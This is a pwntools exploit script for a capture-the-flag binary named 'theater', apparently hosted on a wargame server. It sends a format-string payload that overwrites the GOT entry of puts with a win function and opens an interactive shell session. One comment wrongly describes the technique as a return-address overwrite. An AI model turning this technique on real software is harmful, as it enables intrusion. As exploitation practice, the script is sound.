#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template theater
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'theater')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('pwnable.co.il', 9011, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

io = start()
win_addr = exe.sym['win']
puts_addr = exe.got['puts']
payload = fmtstr_payload(
    6,  # The first 5 arguments are registers, the 6th is on the stack (the payload string)
    {
        puts_addr: win_addr,  # Overwrite puts with win address
    },
    write_size='short'  # Use short writes to avoid overwriting other data
)
# The payload is crafted to overwrite the return address of the function
# that calls puts, redirecting it to win.
io.sendlineafter(b'your favourite movie? ', payload)

io.interactive()